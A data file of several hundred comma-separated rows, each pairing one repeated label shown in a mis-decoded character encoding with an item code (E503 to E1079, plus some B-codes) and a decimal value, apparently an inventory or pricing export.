' ½­Òõ¿â´æ,E503,"",4.48399999999999998579
' ½­Òõ¿â´æ,E504,"",3.26399999999999979039
' ½­Òõ¿â´æ,E505,"",4.66899999999999959499
' ½­Òõ¿â´æ,E508,"",4.08699999999999974420
' ½­Òõ¿â´æ,E509,"",3.16100000000000003197
' ½­Òõ¿â´æ,E510,"",4.98299999999999965183
' ½­Òõ¿â´æ,E511,"",3.64299999999999979394
' ½­Òõ¿â´æ,E512,"",4.66800000000000014921
' ½­Òõ¿â´æ,E513,"",7.00300000000000011369
' ½­Òõ¿â´æ,E514,"",5.16899999999999959499
' ½­Òõ¿â´æ,E515,"",5.56899999999999995026
' ½­Òõ¿â´æ,E516,"",5.56899999999999995026
' ½­Òõ¿â´æ,E517,"",6.67300000000000004263
' ½­Òõ¿â´æ,E519,"",2.69399999999999995026
' ½­Òõ¿â´æ,E520,"",6.58900000000000041211
' ½­Òõ¿â´æ,E521,"",6.58900000000000041211
' ½­Òõ¿â´æ,E522,"",4.67100000000000026290
' ½­Òõ¿â´æ,B523,"",8.69999999999999928946
' ½­Òõ¿â´æ,E523,"",1.55800000000000005151
' ½­Òõ¿â´æ,E524,"",5.56899999999999995026
' ½­Òõ¿â´æ,E525,"",9.65700000000000002842
' ½­Òõ¿â´æ,E526,"",1.32899999999999995914
' ½­Òõ¿â´æ,E528,"",2.52800000000000002487
' ½­Òõ¿â´æ,E529,"",2.48700000000000009948
' ½­Òõ¿â´æ,E530,"",2.98399999999999998579
' ½­Òõ¿â´æ,E531,"",2.98399999999999998579
' ½­Òõ¿â´æ,E532,"",3.83700000000000018829
' ½­Òõ¿â´æ,E534,"",1.95599999999999996092
' ½­Òõ¿â´æ,E535,"",2.98099999999999987210
' ½­Òõ¿â´æ,E536,"",5.88799999999999990052
' ½­Òõ¿â´æ,E537,"",2.72800000000000020250
' ½­Òõ¿â´æ,E538,"",6.80600000000000004974
' ½­Òõ¿â´æ,E541,"",2.07900000000000018119
' ½­Òõ¿â´æ,E542,"",3.24800000000000022027
' ½­Òõ¿â´æ,E543,"",1.84600000000000008527
' ½­Òõ¿â´æ,E544,"",2.15899999999999980815
' ½­Òõ¿â´æ,E545,"",2.91900000000000003908
' ½­Òõ¿â´æ,E546,"",1.85600000000000009415
' ½­Òõ¿â´æ,E547,"",1.06099999999999994316
' ½­Òõ¿â´æ,E548,"",8.34500000000000063949
' ½­Òõ¿â´æ,E549,"",2.17600000000000015632
' ½­Òõ¿â´æ,E551,"",1.90900000000000003020
' ½­Òõ¿â´æ,B552,"",8.69999999999999928946
' ½­Òõ¿â´æ,E552,"",1.30600000000000004974
' ½­Òõ¿â´æ,E553,"",6.60799999999999965183
' ½­Òõ¿â´æ,E554,"",3.99699999999999988631
' ½­Òõ¿â´æ,E555,"",6.60799999999999965183
' ½­Òõ¿â´æ,E556,"",5.88799999999999990052
' ½­Òõ¿â´æ,E557,"",5.88799999999999990052
' ½­Òõ¿â´æ,E558,"",6.40899999999999980815
' ½­Òõ¿â´æ,E559,"",5.91899999999999959499
' ½­Òõ¿â´æ,E560,"",2.50199999999999977973
' ½­Òõ¿â´æ,E561,"",3.24800000000000022027
' ½­Òõ¿â´æ,E562,"",2.71700000000000008171
' ½­Òõ¿â´æ,E563,"",6.21699999999999963762
' ½­Òõ¿â´æ,E564,"",8.41399999999999970157
' ½­Òõ¿â´æ,E565,"",1.84299999999999997158
' ½­Òõ¿â´æ,E566,"",3.31700000000000017053
' ½­Òõ¿â´æ,E567,"",3.35199999999999986855
' ½­Òõ¿â´æ,E568,"",4.25300000000000011369
' ½­Òõ¿â´æ,E569,"",3.88200000000000011724
' ½­Òõ¿â´æ,E571,"",3.22699999999999986855
' ½­Òõ¿â´æ,E573,"",5.40899999999999980815
' ½­Òõ¿â´æ,B574,"",8.69999999999999928946
' ½­Òõ¿â´æ,E574,"",1.34299999999999997158
' ½­Òõ¿â´æ,E575,"",2.91900000000000003908
' ½­Òõ¿â´æ,E576,"",2.76299999999999990052
' ½­Òõ¿â´æ,E578,"",1.03499999999999992006
' ½­Òõ¿â´æ,E579,"",1.06099999999999994316
' ½­Òõ¿â´æ,E580,"",1.33699999999999996625
' ½­Òõ¿â´æ,E581,"",3.01399999999999979039
' ½­Òõ¿â´æ,E583,"",6.59400000000000030553
' ½­Òõ¿â´æ,E584,"",3.30600000000000004974
' ½­Òõ¿â´æ,E585,"",3.88200000000000011724
' ½­Òõ¿â´æ,E588,"",3.01399999999999979039
' ½­Òõ¿â´æ,E589,"",1.36299999999999998934
' ½­Òõ¿â´æ,E590,"",5.83399999999999963052
' ½­Òõ¿â´æ,E591,"",0.81599999999999994760
' ½­Òõ¿â´æ,E592,"",1.84299999999999997158
' ½­Òõ¿â´æ,E593,"",2.91900000000000003908
' ½­Òõ¿â´æ,E594,"",1.98700000000000009948
' ½­Òõ¿â´æ,E595,"",1.73100000000000009415
' ½­Òõ¿â´æ,E596,"",3.44099999999999983658
' ½­Òõ¿â´æ,E597,"",3.23099999999999987210
' ½­Òõ¿â´æ,E598,"",3.28799999999999981171
' ½­Òõ¿â´æ,E600,"",1.98700000000000009948
' ½­Òõ¿â´æ,E601,"",2.98099999999999987210
' ½­Òõ¿â´æ,E602,"",5.56899999999999995026
' ½­Òõ¿â´æ,E603,"",3.01399999999999979039
' ½­Òõ¿â´æ,E604,"",3.85599999999999987210
' ½­Òõ¿â´æ,E605,"",1.17199999999999993072
' ½­Òõ¿â´æ,E608,"",3.10899999999999998579
' ½­Òõ¿â´æ,E609,"",5.87800000000000011369
' ½­Òõ¿â´æ,E611,"",1.62400000000000011013
' ½­Òõ¿â´æ,E612,"",1.70300000000000006928
' ½­Òõ¿â´æ,E615,"",2.54999999999999982236
' ½­Òõ¿â´æ,E616,"",7.54699999999999970868
' ½­Òõ¿â´æ,E617,"",2.48300000000000009592
' ½­Òõ¿â´æ,E618,"",2.61799999999999988276
' ½­Òõ¿â´æ,E619,"",6.48099999999999987210
' ½­Òõ¿â´æ,E620,"",2.00300000000000011369
' ½­Òõ¿â´æ,E621,"",2.16800000000000014921
' ½­Òõ¿â´æ,E623,"",1.20599999999999996092
' ½­Òõ¿â´æ,E624,"",5.32899999999999973710
' ½­Òõ¿â´æ,B625,"",8.69999999999999928946
' ½­Òõ¿â´æ,E625,"",1.55800000000000005151
' ½­Òõ¿â´æ,E626,"",3.23799999999999998934
' ½­Òõ¿â´æ,E627,"",3.78100000000000013856
' ½­Òõ¿â´æ,E629,"",1.82299999999999995381
' ½­Òõ¿â´æ,E630,"",0.83599999999999996536
' ½­Òõ¿â´æ,E631,"",2.30799999999999982947
' ½­Òõ¿â´æ,E632,"",2.41199999999999992184
' ½­Òõ¿â´æ,E633,"",2.41199999999999992184
' ½­Òõ¿â´æ,E635,"",3.53299999999999991829
' ½­Òõ¿â´æ,E637,"",2.07200000000000006395
' ½­Òõ¿â´æ,E639,"",1.82299999999999995381
' ½­Òõ¿â´æ,E640,"",1.53899999999999992362
' ½­Òõ¿â´æ,E641,"",3.08400000000000007461
' ½­Òõ¿â´æ,E642,"",5.53899999999999970157
' ½­Òõ¿â´æ,E644,"",2.28799999999999981171
' ½­Òõ¿â´æ,E646,"",3.37400000000000011013
' ½­Òõ¿â´æ,E647,"",3.07100000000000017408
' ½­Òõ¿â´æ,E648,"",3.07100000000000017408
' ½­Òõ¿â´æ,E649,"",3.07100000000000017408
' ½­Òõ¿â´æ,E650,"",1.56099999999999994316
' ½­Òõ¿â´æ,E651,"",3.50700000000000011724
' ½­Òõ¿â´æ,E652,"",1.40199999999999991296
' ½­Òõ¿â´æ,E653,"",2.02700000000000013500
' ½­Òõ¿â´æ,E654,"",0.86399999999999999023
' ½­Òõ¿â´æ,E655,"",3.17700000000000004619
' ½­Òõ¿â´æ,E657,"",7.15299999999999958078
' ½­Òõ¿â´æ,E658,"",5.72100000000000008527
' ½­Òõ¿â´æ,E659,"",1.20599999999999996092
' ½­Òõ¿â´æ,E660,"",4.44200000000000017053
' ½­Òõ¿â´æ,E662,"",3.76799999999999979394
' ½­Òõ¿â´æ,E663,"",3.24199999999999999289
' ½­Òõ¿â´æ,E664,"",0.52800000000000002487
' ½­Òõ¿â´æ,E667,"",2.94200000000000017053
' ½­Òõ¿â´æ,E668,"",7.75699999999999967315
' ½­Òõ¿â´æ,E669,"",3.83400000000000007461
' ½­Òõ¿â´æ,E670,"",1.20599999999999996092
' ½­Òõ¿â´æ,E671,"",1.20599999999999996092
' ½­Òõ¿â´æ,E672,"",1.20599999999999996092
' ½­Òõ¿â´æ,E673,"",3.89400000000000012790
' ½­Òõ¿â´æ,E674,"",5.94899999999999984368
' ½­Òõ¿â´æ,E675,"",3.89400000000000012790
' ½­Òõ¿â´æ,E677,"",3.50700000000000011724
' ½­Òõ¿â´æ,B681,"",18.39999999999999857891
' ½­Òõ¿â´æ,E681,"",5.37300000000000022027
' ½­Òõ¿â´æ,B682,"",18.39999999999999857891
' ½­Òõ¿â´æ,E682,"",4.97499999999999964473
' ½­Òõ¿â´æ,E683,"",2.99199999999999999289
' ½­Òõ¿â´æ,E684,"",0.44900000000000001021
' ½­Òõ¿â´æ,E685,"",1.14300000000000001599
' ½­Òõ¿â´æ,E686,"",2.67700000000000004619
' ½­Òõ¿â´æ,E687,"",2.78100000000000013856
' ½­Òõ¿â´æ,E689,"",2.13700000000000001066
' ½­Òõ¿â´æ,E690,"",6.05100000000000015632
' ½­Òõ¿â´æ,E691,"",2.05399999999999982592
' ½­Òõ¿â´æ,E692,"",3.24900000000000011013
' ½­Òõ¿â´æ,E693,"",5.51100000000000012079
' ½­Òõ¿â´æ,E694,"",1.32699999999999995737
' ½­Òõ¿â´æ,E695,"",1.48799999999999998934
' ½­Òõ¿â´æ,B696,"",8.69999999999999928946
' ½­Òõ¿â´æ,E697,"",9.95800000000000018474
' ½­Òõ¿â´æ,B698,"",18.39999999999999857891
' ½­Òõ¿â´æ,E698,"",4.97499999999999964473
' ½­Òõ¿â´æ,E699,"",1.14300000000000001599
' ½­Òõ¿â´æ,E700,"",1.02899999999999991473
' ½­Òõ¿â´æ,E701,"",2.95900000000000007461
' ½­Òõ¿â´æ,E702,"",1.42900000000000004796
' ½­Òõ¿â´æ,E703,"",0.50900000000000000799
' ½­Òõ¿â´æ,E704,"",4.66800000000000014921
' ½­Òõ¿â´æ,E705,"",1.75800000000000000711
' ½­Òõ¿â´æ,E706,"",1.14300000000000001599
' ½­Òõ¿â´æ,E707,"",1.14300000000000001599
' ½­Òõ¿â´æ,E708,"",1.99300000000000010481
' ½­Òõ¿â´æ,E709,"",6.59900000000000019895
' ½­Òõ¿â´æ,E710,"",2.42099999999999981881
' ½­Òõ¿â´æ,E711,"",1.95100000000000006750
' ½­Òõ¿â´æ,E714,"",5.88799999999999990052
' ½­Òõ¿â´æ,E715,"",1.14300000000000001599
' ½­Òõ¿â´æ,E716,"",4.32699999999999995737
' ½­Òõ¿â´æ,E717,"",1.75800000000000000711
' ½­Òõ¿â´æ,E718,"",0.81599999999999994760
' ½­Òõ¿â´æ,E719,"",6.35899999999999998579
' ½­Òõ¿â´æ,E720,"",1.49199999999999999289
' ½­Òõ¿â´æ,E721,"",4.54699999999999970868
' ½­Òõ¿â´æ,E722,"",4.66800000000000014921
' ½­Òõ¿â´æ,E723,"",1.14300000000000001599
' ½­Òõ¿â´æ,E724,"",4.79199999999999981526
' ½­Òõ¿â´æ,E726,"",1.11899999999999999467
' ½­Òõ¿â´æ,E727,"",2.98099999999999987210
' ½­Òõ¿â´æ,E728,"",1.50600000000000000533
' ½­Òõ¿â´æ,E729,"",3.16100000000000003197
' ½­Òõ¿â´æ,B732,"",8.69999999999999928946
' ½­Òõ¿â´æ,E732,"",1.55800000000000005151
' ½­Òõ¿â´æ,E733,"",4.66800000000000014921
' ½­Òõ¿â´æ,E734,"",1.25299999999999989164
' ½­Òõ¿â´æ,E735,"",4.43400000000000016342
' ½­Òõ¿â´æ,E736,"",8.57199999999999917577
' ½­Òõ¿â´æ,B737,"",8.69999999999999928946
' ½­Òõ¿â´æ,E737,"",1.53699999999999992184
' ½­Òõ¿â´æ,B740,"",8.69999999999999928946
' ½­Òõ¿â´æ,E740,"",1.24199999999999999289
' ½­Òõ¿â´æ,E741,"",2.98399999999999998579
' ½­Òõ¿â´æ,B742,"",8.69999999999999928946
' ½­Òõ¿â´æ,E742,"",1.99199999999999999289
' ½­Òõ¿â´æ,E743,"",3.24800000000000022027
' ½­Òõ¿â´æ,E744,"",8.24300000000000032685
' ½­Òõ¿â´æ,E745,"",1.14300000000000001599
' ½­Òõ¿â´æ,E747,"",5.00800000000000000711
' ½­Òõ¿â´æ,E748,"",3.85599999999999987210
' ½­Òõ¿â´æ,E749,"",3.24800000000000022027
' ½­Òõ¿â´æ,E750,"",7.53599999999999958789
' ½­Òõ¿â´æ,E751,"",5.40700000000000002842
' ½­Òõ¿â´æ,E752,"",3.83099999999999996092
' ½­Òõ¿â´æ,E753,"",3.22900000000000009237
' ½­Òõ¿â´æ,B754,"",18.39999999999999857891
' ½­Òõ¿â´æ,E754,"",5.37300000000000022027
' ½­Òõ¿â´æ,E755,"",4.42699999999999960210
' ½­Òõ¿â´æ,E756,"",3.36799999999999988276
' ½­Òõ¿â´æ,E757,"",6.19099999999999983658
' ½­Òõ¿â´æ,E758,"",0.92900000000000004796
' ½­Òõ¿â´æ,E759,"",0.76100000000000000977
' ½­Òõ¿â´æ,E760,"",5.98200000000000020606
' ½­Òõ¿â´æ,E761,"",3.88200000000000011724
' ½­Òõ¿â´æ,E762,"",2.17600000000000015632
' ½­Òõ¿â´æ,E763,"",2.17600000000000015632
' ½­Òõ¿â´æ,E764,"",3.27899999999999991473
' ½­Òõ¿â´æ,E766,"",2.40200000000000013500
' ½­Òõ¿â´æ,E767,"",0.79600000000000004086
' ½­Òõ¿â´æ,E768,"",4.90700000000000002842
' ½­Òõ¿â´æ,E769,"",5.98200000000000020606
' ½­Òõ¿â´æ,E771,"",3.07100000000000017408
' ½­Òõ¿â´æ,E772,"",3.53299999999999991829
' ½­Òõ¿â´æ,E773,"",3.53299999999999991829
' ½­Òõ¿â´æ,E775,"",4.84299999999999997158
' ½­Òõ¿â´æ,E776,"",4.19299999999999961631
' ½­Òõ¿â´æ,E777,"",4.86899999999999977263
' ½­Òõ¿â´æ,E779,"",7.07200000000000006395
' ½­Òõ¿â´æ,E780,"",6.79699999999999970868
' ½­Òõ¿â´æ,E781,"",2.43100000000000004974
' ½­Òõ¿â´æ,E782,"",3.27899999999999991473
' ½­Òõ¿â´æ,E783,"",2.87400000000000011013
' ½­Òõ¿â´æ,E784,"",3.53299999999999991829
' ½­Òõ¿â´æ,B786,"",8.69999999999999928946
' ½­Òõ¿â´æ,E786,"",0.89600000000000001865
' ½­Òõ¿â´æ,E787,"",3.29700000000000015277
' ½­Òõ¿â´æ,E788,"",2.39599999999999990763
' ½­Òõ¿â´æ,E789,"",0.66300000000000003375
' ½­Òõ¿â´æ,E790,"",3.66900000000000003908
' ½­Òõ¿â´æ,E791,"",3.27899999999999991473
' ½­Òõ¿â´æ,E792,"",5.66399999999999970157
' ½­Òõ¿â´æ,E793,"",0.62399999999999999911
' ½­Òõ¿â´æ,E794,"",4.66800000000000014921
' ½­Òõ¿â´æ,E795,"",4.66800000000000014921
' ½­Òõ¿â´æ,E796,"",1.20599999999999996092
' ½­Òõ¿â´æ,E797,"",1.20599999999999996092
' ½­Òõ¿â´æ,E798,"",3.83099999999999996092
' ½­Òõ¿â´æ,E799,"",4.66800000000000014921
' ½­Òõ¿â´æ,E800,"",1.50800000000000000711
' ½­Òõ¿â´æ,E801,"",2.91800000000000014921
' ½­Òõ¿â´æ,E803,"",1.74799999999999999822
' ½­Òõ¿â´æ,E804,"",2.84399999999999986144
' ½­Òõ¿â´æ,E805,"",1.47700000000000009059
' ½­Òõ¿â´æ,E806,"",3.76799999999999979394
' ½­Òõ¿â´æ,E807,"",1.20599999999999996092
' ½­Òõ¿â´æ,E810,"",3.76799999999999979394
' ½­Òõ¿â´æ,E811,"",2.89699999999999979750
' ½­Òõ¿â´æ,E812,"",6.60799999999999965183
' ½­Òõ¿â´æ,E814,"",2.51299999999999990052
' ½­Òõ¿â´æ,E815,"",7.32099999999999972999
' ½­Òõ¿â´æ,E817,"",2.77400000000000002132
' ½­Òõ¿â´æ,E818,"",2.16199999999999992184
' ½­Òõ¿â´æ,E819,"",3.29300000000000014921
' ½­Òõ¿â´æ,E820,"",5.32699999999999995737
' ½­Òõ¿â´æ,E821,"",5.32699999999999995737
' ½­Òõ¿â´æ,E825,"",6.00300000000000011369
' ½­Òõ¿â´æ,E827,"",3.19799999999999995381
' ½­Òõ¿â´æ,E828,"",3.52899999999999991473
' ½­Òõ¿â´æ,E830,"",6.13199999999999967315
' ½­Òõ¿â´æ,E831,"",0.64300000000000001599
' ½­Òõ¿â´æ,E832,"",4.77200000000000024158
' ½­Òõ¿â´æ,E833,"",4.94700000000000006395
' ½­Òõ¿â´æ,E834,"",2.03399999999999980815
' ½­Òõ¿â´æ,E835,"",5.43299999999999982947
' ½­Òõ¿â´æ,E836,"",4.41600000000000036948
' ½­Òõ¿â´æ,E837,"",4.99399999999999977263
' ½­Òõ¿â´æ,E838,"",4.61599999999999965894
' ½­Òõ¿â´æ,E839,"",4.20899999999999963052
' ½­Òõ¿â´æ,E840,"",5.25800000000000000711
' ½­Òõ¿â´æ,E841,"",5.25800000000000000711
' ½­Òõ¿â´æ,E842,"",5.98200000000000020606
' ½­Òõ¿â´æ,E843,"",1.56099999999999994316
' ½­Òõ¿â´æ,E845,"",3.07100000000000017408
' ½­Òõ¿â´æ,E846,"",3.07100000000000017408
' ½­Òõ¿â´æ,E848,"",3.98899999999999987921
' ½­Òõ¿â´æ,E849,"",4.42699999999999960210
' ½­Òõ¿â´æ,E850,"",2.17399999999999993250
' ½­Òõ¿â´æ,E851,"",1.06400000000000005684
' ½­Òõ¿â´æ,E853,"",2.89199999999999990408
' ½­Òõ¿â´æ,E854,"",2.17600000000000015632
' ½­Òõ¿â´æ,E855,"",4.61599999999999965894
' ½­Òõ¿â´æ,E856,"",3.07699999999999995737
' ½­Òõ¿â´æ,E858,"",5.43299999999999982947
' ½­Òõ¿â´æ,E859,"",5.43299999999999982947
' ½­Òõ¿â´æ,E860,"",2.67700000000000004619
' ½­Òõ¿â´æ,E861,"",2.76900000000000012790
' ½­Òõ¿â´æ,E862,"",2.44899999999999984368
' ½­Òõ¿â´æ,E863,"",1.84299999999999997158
' ½­Òõ¿â´æ,B864,"",8.69999999999999928946
' ½­Òõ¿â´æ,E864,"",1.55800000000000005151
' ½­Òõ¿â´æ,E865,"",1.25600000000000000533
' ½­Òõ¿â´æ,E866,"",1.68100000000000004974
' ½­Òõ¿â´æ,E867,"",1.43900000000000005684
' ½­Òõ¿â´æ,E868,"",2.45199999999999995737
' ½­Òõ¿â´æ,E870,"",1.82600000000000006750
' ½­Òõ¿â´æ,E871,"",2.40200000000000013500
' ½­Òõ¿â´æ,E872,"",2.08899999999999996803
' ½­Òõ¿â´æ,E873,"",3.10899999999999998579
' ½­Òõ¿â´æ,E874,"",2.31800000000000006040
' ½­Òõ¿â´æ,E875,"",4.29699999999999970868
' ½­Òõ¿â´æ,E876,"",1.25600000000000000533
' ½­Òõ¿â´æ,E877,"",1.25600000000000000533
' ½­Òõ¿â´æ,E878,"",1.90700000000000002842
' ½­Òõ¿â´æ,E879,"",4.00399999999999955946
' ½­Òõ¿â´æ,E880,"",1.22599999999999997868
' ½­Òõ¿â´æ,E881,"",3.56400000000000005684
' ½­Òõ¿â´æ,E882,"",0.93400000000000005240
' ½­Òõ¿â´æ,E883,"",0.62399999999999999911
' ½­Òõ¿â´æ,E884,"",1.66799999999999992717
' ½­Òõ¿â´æ,E885,"",0.80900000000000005240
' ½­Òõ¿â´æ,E886,"",4.67699999999999960210
' ½­Òõ¿â´æ,E891,"",5.37300000000000022027
' ½­Òõ¿â´æ,E893,"",4.81799999999999961631
' ½­Òõ¿â´æ,E894,"",2.08899999999999996803
' ½­Òõ¿â´æ,E895,"",3.79400000000000003908
' ½­Òõ¿â´æ,E896,"",3.66800000000000014921
' ½­Òõ¿â´æ,E897,"",2.90099999999999980105
' ½­Òõ¿â´æ,E898,"",1.25600000000000000533
' ½­Òõ¿â´æ,E900,"",0.56999999999999995115
' ½­Òõ¿â´æ,E901,"",0.43900000000000000133
' ½­Òõ¿â´æ,E902,"",1.55699999999999993960
' ½­Òõ¿â´æ,E905,"",4.89100000000000001421
' ½­Òõ¿â´æ,E906,"",5.02099999999999990763
' ½­Òõ¿â´æ,E907,"",4.89100000000000001421
' ½­Òõ¿â´æ,E908,"",0.68200000000000005063
' ½­Òõ¿â´æ,E909,"",1.00099999999999988987
' ½­Òõ¿â´æ,E910,"",5.02099999999999990763
' ½­Òõ¿â´æ,E911,"",12.29299999999999926104
' ½­Òõ¿â´æ,E913,"",1.00099999999999988987
' ½­Òõ¿â´æ,E915,"",2.15399999999999991473
' ½­Òõ¿â´æ,E917,"",3.90300000000000002487
' ½­Òõ¿â´æ,E918,"",5.37300000000000022027
' ½­Òõ¿â´æ,E921,"",5.69399999999999995026
' ½­Òõ¿â´æ,E922,"",2.08899999999999996803
' ½­Òõ¿â´æ,E923,"",4.88199999999999967315
' ½­Òõ¿â´æ,E925,"",2.56700000000000017053
' ½­Òõ¿â´æ,E927,"",2.58300000000000018474
' ½­Òõ¿â´æ,E928,"",5.37300000000000022027
' ½­Òõ¿â´æ,E929,"",1.25600000000000000533
' ½­Òõ¿â´æ,E930,"",5.14200000000000034817
' ½­Òõ¿â´æ,E932,"",0.41199999999999997735
' ½­Òõ¿â´æ,E933,"",2.66800000000000014921
' ½­Òõ¿â´æ,E934,"",2.56700000000000017053
' ½­Òõ¿â´æ,E935,"",0.49199999999999999289
' ½­Òõ¿â´æ,E936,"",0.39600000000000001865
' ½­Òõ¿â´æ,E937,"",1.24300000000000010481
' ½­Òõ¿â´æ,E939,"",1.91399999999999992362
' ½­Òõ¿â´æ,E940,"",8.20299999999999940314
' ½­Òõ¿â´æ,E941,"",2.51799999999999979394
' ½­Òõ¿â´æ,E943,"",0.37800000000000000266
' ½­Òõ¿â´æ,E944,"",3.79400000000000003908
' ½­Òõ¿â´æ,E945,"",2.80399999999999982592
' ½­Òõ¿â´æ,E946,"",1.25600000000000000533
' ½­Òõ¿â´æ,E947,"",1.25600000000000000533
' ½­Òõ¿â´æ,E948,"",3.25599999999999978328
' ½­Òõ¿â´æ,E949,"",5.29399999999999959499
' ½­Òõ¿â´æ,E950,"",5.91899999999999959499
' ½­Òõ¿â´æ,E951,"",4.23899999999999987921
' ½­Òõ¿â´æ,E953,"",3.69799999999999995381
' ½­Òõ¿â´æ,E954,"",2.62400000000000011013
' ½­Òõ¿â´æ,E955,"",6.76799999999999979394
' ½­Òõ¿â´æ,E957,"",0.58399999999999996358
' ½­Òõ¿â´æ,E958,"",0.81599999999999994760
' ½­Òõ¿â´æ,E959,"",1.26899999999999990585
' ½­Òõ¿â´æ,E960,"",2.56700000000000017053
' ½­Òõ¿â´æ,E961,"",2.40200000000000013500
' ½­Òõ¿â´æ,E962,"",2.69300000000000006040
' ½­Òõ¿â´æ,E963,"",0.92700000000000004619
' ½­Òõ¿â´æ,E964,"",0.92700000000000004619
' ½­Òõ¿â´æ,E965,"",4.30999999999999960920
' ½­Òõ¿â´æ,E966,"",0.70399999999999995914
' ½­Òõ¿â´æ,E967,"",1.81099999999999994316
' ½­Òõ¿â´æ,E968,"",2.56700000000000017053
' ½­Òõ¿â´æ,E969,"",1.84299999999999997158
' ½­Òõ¿â´æ,E971,"",0.76900000000000001688
' ½­Òõ¿â´æ,E972,"",2.39299999999999979394
' ½­Òõ¿â´æ,E973,"",1.84299999999999997158
' ½­Òõ¿â´æ,E975,"",1.12999999999999989342
' ½­Òõ¿â´æ,E977,"",1.00099999999999988987
' ½­Òõ¿â´æ,E978,"",2.44899999999999984368
' ½­Òõ¿â´æ,E979,"",5.88199999999999967315
' ½­Òõ¿â´æ,E982,"",3.89400000000000012790
' ½­Òõ¿â´æ,E984,"",4.92699999999999960210
' ½­Òõ¿â´æ,E985,"",0.62800000000000000266
' ½­Òõ¿â´æ,E987,"",2.18299999999999982947
' ½­Òõ¿â´æ,E988,"",1.45100000000000006750
' ½­Òõ¿â´æ,E989,"",5.69399999999999995026
' ½­Òõ¿â´æ,E990,"",1.62299999999999999822
' ½­Òõ¿â´æ,E991,"",2.19399999999999995026
' ½­Òõ¿â´æ,E993,"",1.11400000000000010125
' ½­Òõ¿â´æ,E994,"",1.16199999999999992184
' ½­Òõ¿â´æ,E995,"",1.42100000000000004086
' ½­Òõ¿â´æ,E996,"",1.95900000000000007461
' ½­Òõ¿â´æ,E997,"",3.75599999999999978328
' ½­Òõ¿â´æ,E998,"",1.49799999999999999822
' ½­Òõ¿â´æ,E999,"",0.78300000000000002931
' ½­Òõ¿â´æ,E1000,"",4.34900000000000019895
' ½­Òõ¿â´æ,E1001,"",4.24899999999999966604
' ½­Òõ¿â´æ,E1002,"",4.24899999999999966604
' ½­Òõ¿â´æ,E1003,"",0.56499999999999994671
' ½­Òõ¿â´æ,E1004,"",2.63899999999999979039
' ½­Òõ¿â´æ,E1005,"",1.31800000000000006040
' ½­Òõ¿â´æ,E1006,"",4.13699999999999956657
' ½­Òõ¿â´æ,E1007,"",1.00099999999999988987
' ½­Òõ¿â´æ,E1008,"",1.00099999999999988987
' ½­Òõ¿â´æ,E1009,"",2.02099999999999990763
' ½­Òõ¿â´æ,E1010,"",0.91100000000000003197
' ½­Òõ¿â´æ,E1011,"",2.40200000000000013500
' ½­Òõ¿â´æ,E1012,"",2.40200000000000013500
' ½­Òõ¿â´æ,E1014,"",1.00099999999999988987
' ½­Òõ¿â´æ,E1015,"",3.28399999999999980815
' ½­Òõ¿â´æ,E1016,"",3.89400000000000012790
' ½­Òõ¿â´æ,E1017,"",1.95900000000000007461
' ½­Òõ¿â´æ,E1018,"",3.01399999999999979039
' ½­Òõ¿â´æ,E1020,"",1.00099999999999988987
' ½­Òõ¿â´æ,E1021,"",1.00099999999999988987
' ½­Òõ¿â´æ,E1023,"",3.55900000000000016342
' ½­Òõ¿â´æ,E1024,"",5.03800000000000025580
' ½­Òõ¿â´æ,E1025,"",1.35699999999999998401
' ½­Òõ¿â´æ,E1026,"",4.37100000000000044054
' ½­Òõ¿â´æ,E1027,"",4.57300000000000039790
' ½­Òõ¿â´æ,E1028,"",1.12099999999999999645
' ½­Òõ¿â´æ,E1031,"",0.93300000000000005151
' ½­Òõ¿â´æ,E1032,"",4.12600000000000033396
' ½­Òõ¿â´æ,E1033,"",1.50899999999999989697
' ½­Òõ¿â´æ,E1034,"",4.19700000000000006395
' ½­Òõ¿â´æ,E1035,"",1.03600000000000003197
' ½­Òõ¿â´æ,E1036,"",5.00600000000000022737
' ½­Òõ¿â´æ,B1037,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1037,"",1.30600000000000004974
' ½­Òõ¿â´æ,B1038,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1038,"",1.91300000000000003375
' ½­Òõ¿â´æ,E1039,"",4.30999999999999960920
' ½­Òõ¿â´æ,E1040,"",2.79800000000000004263
' ½­Òõ¿â´æ,E1041,"",1.27400000000000002132
' ½­Òõ¿â´æ,E1042,"",2.94200000000000017053
' ½­Òõ¿â´æ,E1043,"",5.80299999999999993605
' ½­Òõ¿â´æ,E1044,"",0.50900000000000000799
' ½­Òõ¿â´æ,E1045,"",1.12999999999999989342
' ½­Òõ¿â´æ,E1046,"",2.91900000000000003908
' ½­Òõ¿â´æ,E1047,"",5.33800000000000007816
' ½­Òõ¿â´æ,E1048,"",2.96300000000000007816
' ½­Òõ¿â´æ,E1049,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1050,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1051,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1052,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1053,"",1.22799999999999998046
' ½­Òõ¿â´æ,B1054,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1054,"",1.82099999999999995204
' ½­Òõ¿â´æ,E1055,"",4.15899999999999980815
' ½­Òõ¿â´æ,E1057,"",1.22500000000000008882
' ½­Òõ¿â´æ,E1058,"",0.69099999999999994760
' ½­Òõ¿â´æ,E1059,"",5.72799999999999975842
' ½­Òõ¿â´æ,E1060,"",8.46700000000000052580
' ½­Òõ¿â´æ,E1061,"",2.79800000000000004263
' ½­Òõ¿â´æ,B1062,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1062,"",1.82099999999999995204
' ½­Òõ¿â´æ,E1063,"",2.91900000000000003908
' ½­Òõ¿â´æ,E1064,"",3.18400000000000016342
' ½­Òõ¿â´æ,E1065,"",5.22799999999999975842
' ½­Òõ¿â´æ,B1066,"",8.69999999999999928946
' ½­Òõ¿â´æ,E1066,"",1.07400000000000006573
' ½­Òõ¿â´æ,E1068,"",3.11699999999999999289
' ½­Òõ¿â´æ,E1069,"",1.28400000000000003020
' ½­Òõ¿â´æ,E1070,"",4.35200000000000031264
' ½­Òõ¿â´æ,E1071,"",4.26199999999999956657
' ½­Òõ¿â´æ,E1072,"",2.30799999999999982947
' ½­Òõ¿â´æ,E1073,"",1.95799999999999996270
' ½­Òõ¿â´æ,E1074,"",4.81799999999999961631
' ½­Òõ¿â´æ,E1075,"",2.77899999999999991473
' ½­Òõ¿â´æ,E1076,"",3.10599999999999987210
' ½­Òõ¿â´æ,E1077,"",4.26199999999999956657
' ½­Òõ¿â´æ,E1078,"",0.56999999999999995115
' ½­Òõ¿â´æ,E1079,"",1.01899999999999990585
